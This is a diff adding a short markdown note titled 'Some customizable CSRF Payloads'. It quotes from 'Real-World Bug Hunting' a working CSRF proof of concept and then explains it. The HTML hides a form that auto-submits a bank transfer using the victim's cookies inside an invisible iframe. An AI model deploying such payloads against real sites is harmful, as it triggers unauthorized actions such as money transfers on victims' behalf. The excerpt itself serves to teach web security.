@@ -1,0 +1,27 @@
+# Some customizable CSRF Payloads 
+
+<iframe style="display:none" name="csrf-frame"></iframe>
+➋ <form method='POST' action='http://bank.com/transfer' target="csrf-frame"
+id="csrf-form">
+➌ <input type='hidden' name='from' value='Bob'>
+<input type='hidden' name='to' value='Joe'>
+<input type='hidden' name='amount' value='500'>
+<input type='submit' value='submit'>
+</form>
+➍ <script>document.getElementById("csrf-form").submit()</script>
+Here, we’re making an HTTP POST request ➋ to Bob’s bank with a
+form (which is denoted by the action attribute in the <form> tag).
+Because the attacker doesn’t want Bob to see the form, each of the
+<input> elements ➌ are given the type 'hidden', which makes them
+invisible on the web page Bob sees. As the final step, the attacker
+includes some JavaScript inside a <script> tag to automatically submit
+the form when the page is loaded ➍. The JavaScript does this by calling
+the getElementByID() method on the HTML document with the ID of the
+form ("csrf-form") that we set in the second line ➋ as an argument. As
+with a GET request, once the form is submitted, the browser makes the
+HTTP POST request to send Bob’s cookies to the bank site, which
+invokes a transfer. Because POST requests send an HTTP response back
+to the browser, the attacker hides the response in an iFrame using the
+display:none attribute ➊. As a result, Bob doesn’t see it and doesn’t
+realize what has happened.
+  ~ Real-World Bug Hunting
